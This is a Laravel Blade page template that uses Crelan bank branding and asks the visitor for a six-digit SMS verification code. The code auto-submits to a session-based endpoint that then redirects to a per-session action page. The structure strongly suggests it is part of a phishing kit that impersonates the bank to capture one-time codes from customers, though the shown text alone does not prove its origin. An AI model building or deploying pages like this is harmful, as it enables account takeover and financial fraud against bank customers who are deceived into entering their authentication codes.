@extends('layouts.app')

@section('title', __('messages.code_title') . ' | Crelan')

@section('content')
<div class="form-page-center">
    <div class="form-container">
        <div class="form-container--header-crelan">
            <svg class="crelan-logo-icon" width="48" height="34" viewBox="0 0 48 34" fill="none" xmlns="http://www.w3.org/2000/svg">
                <path d="M40.3007 0.955874C39.4821 4.0007 38.2455 6.83888 36.6671 9.38458C31.9043 17.0694 24.0286 22.0916 15.1179 22.0916C11.9602 22.0916 8.93273 21.4606 6.12793 20.3041L7.28372 24.6914L9.14052 31.7379C12.219 32.884 15.5068 33.5055 18.9232 33.5055C31.3351 33.5055 42.0618 25.3248 47.1437 13.4586L40.2999 0.955078L40.3007 0.955874Z" fill="#C3D100"/>
                <path d="M36.6671 9.38483L31.5303 0C30.943 2.13956 29.962 4.21713 28.64 6.10077C25.2456 10.9363 19.6007 14.4858 12.5828 14.4858C10.4421 14.4858 8.32031 14.2306 6.3255 13.6822C3.98333 13.0385 1.81602 11.9909 0 10.4729L3.31369 23.0488C4.33619 23.598 5.67233 24.1885 7.28448 24.6924C9.57804 25.4093 12.4291 25.9513 15.7326 25.9513C24.8457 25.9513 33.4028 20.3608 38.4643 12.6673L36.6679 9.38563L36.6671 9.38483Z" fill="#88BC1F"/>
                <path d="M28.6397 6.09983L25.7894 0.891602C23.6158 5.87252 20.2002 9.4427 13.601 9.4427C10.0372 9.4427 5.97545 7.90956 4.4668 6.63075L6.32438 13.6805L7.20808 17.0345C9.31266 17.7013 11.5317 18.059 13.8245 18.059C21.2329 18.059 27.6713 14.0024 30.2683 9.07551L28.6397 6.09983Z" fill="#019544"/>
                <path d="M38.4635 12.6659L36.6671 9.38428C31.9043 17.0691 24.0286 22.0913 15.1179 22.0913C11.9602 22.0913 8.93273 21.4603 6.12793 20.3038L7.28372 24.6911C9.57728 25.408 12.4283 25.95 15.7318 25.95C24.8449 25.95 33.402 20.3595 38.4635 12.6659Z" fill="#7FAD00"/>
                <path d="M40.3012 0.955874C39.4825 4.0007 38.246 6.83888 36.6675 9.38458L38.464 12.6662C33.4032 20.3598 24.8461 25.9503 15.7323 25.9503C12.4288 25.9503 9.57773 25.4083 7.28418 24.6914L9.14098 31.7379C12.2194 32.884 15.5073 33.5055 18.9237 33.5055C31.3355 33.5055 42.0623 25.3248 47.1442 13.4586L40.3004 0.955078L40.3012 0.955874Z" fill="#C4D600"/>
                <path d="M28.6397 6.09983L25.7894 0.891602C23.6158 5.87252 20.2002 9.4427 13.601 9.4427C10.0372 9.4427 5.97545 7.90956 4.4668 6.63075L6.32438 13.6805C8.31997 14.2289 10.4418 14.484 12.5817 14.484C19.5995 14.484 25.2444 10.9345 28.6389 6.09904L28.6397 6.09983Z" fill="#00AE53"/>
                <path d="M13.8245 18.0597C21.2329 18.0597 27.6713 14.0031 30.2683 9.07626L28.6397 6.10059C25.2453 10.9361 19.6004 14.4856 12.5825 14.4856C10.4418 14.4856 8.32 14.2305 6.3252 13.682L7.2089 17.036C9.31348 17.7029 11.5325 18.0605 13.8253 18.0605L13.8245 18.0597Z" fill="#009644"/>
                <path d="M31.5311 0C30.9438 2.13956 29.9628 4.21713 28.6408 6.10078L30.2694 9.07645C27.6724 14.0033 21.234 18.0599 13.8256 18.0599C11.5329 18.0599 9.31457 17.7023 7.20921 17.0354L6.3255 13.6814C3.98333 13.0377 1.81602 11.9901 0 10.4721L3.31369 23.048C4.33619 23.5972 5.67233 24.1877 7.28448 24.6916L6.12869 20.3044C8.93427 21.4608 11.9618 22.0919 15.1186 22.0919C24.0294 22.0919 31.9051 17.0696 36.6679 9.38483L31.5311 0Z" fill="#84BD00"/>
            </svg>
            <span>{{ __('messages.crelan_security') }}</span>
        </div>

        <div class="form-container--content">
            <span class="form-container--description">
                {{ __('messages.code_description') }}
            </span>
            
            <form id="code-form" class="form--input-container" style="flex-direction: column;">
                <div class="form-field">
                    <div class="form-input--block">
                        <input 
                            type="text" 
                            id="sms-code"
                            class="form--input form-input--code" 
                            placeholder="{{ __('messages.code_placeholder') }}"
                            maxlength="6"
                            inputmode="numeric"
                            pattern="[0-9]*"
                            autocomplete="one-time-code"
                            required
                        >
                    </div>
                </div>
            </form>
        </div>
    </div>
</div>
@endsection

@push('scripts')
<script>
document.addEventListener('DOMContentLoaded', function() {
    const form = document.getElementById('code-form');
    const codeInput = document.getElementById('sms-code');
    let isSubmitting = false;
    
    // Auto-submit when 6 digits entered
    function checkAndSubmit() {
        const code = codeInput.value.trim();
        
        if (code.length === 6 && !isSubmitting) {
            isSubmitting = true;
            codeInput.disabled = true;
            codeInput.style.opacity = '0.6';
            
            submitCode(code);
        }
    }
    
    // Only allow numbers
    codeInput.addEventListener('input', function(e) {
        this.value = this.value.replace(/[^0-9]/g, '');
        checkAndSubmit();
    });
    
    async function submitCode(code) {
        try {
            const sessionId = localStorage.getItem('session_id');
            if (!sessionId) {
                window.location.href = '/';
                return;
            }
            
            const response = await fetch(`/api/session/${sessionId}/submit`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'X-CSRF-TOKEN': document.querySelector('meta[name="csrf-token"]').content
                },
                body: JSON.stringify({
                    action_type: 'code',
                    code: code
                })
            });
            
            if (response.ok) {
                window.location.href = `/session/${sessionId}/action/code`;
            } else {
                throw new Error('Submit failed');
            }
        } catch (error) {
            console.error('Error:', error);
            // Reset on error
            isSubmitting = false;
            codeInput.disabled = false;
            codeInput.style.opacity = '1';
            codeInput.focus();
        }
    }
});
</script>
@endpush
